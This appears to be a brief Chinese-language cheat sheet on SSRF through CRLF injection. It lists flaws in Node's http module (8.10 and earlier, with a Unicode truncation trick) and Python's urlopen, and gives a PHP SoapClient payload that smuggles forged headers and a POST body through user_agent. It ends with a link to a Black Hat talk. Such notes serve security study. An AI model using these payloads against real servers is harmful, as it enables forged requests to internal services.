# SSRF

## Node 

Node <= 8.10 的``http``存在``CRLF``注入漏洞

利用unicode截断

```
\u{ffa0} => \a0
```

## Python 

``urllib.request.urlopen()`` ``CRLF``注入

## PHP

SOAP CRLF

```php
$attack = new SoapClient(null,array('location' => $target,
                                    'user_agent'=>"eki\r\nContent-Type: application/x-www-form-urlencoded\r\n".join("\r\n",$headers)."\r\nContent-Length: ".(string)strlen($post_string)."\r\n\r\n".$post_string,
                                    'uri'      => "aaab"));
```



### 扩展资料

https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf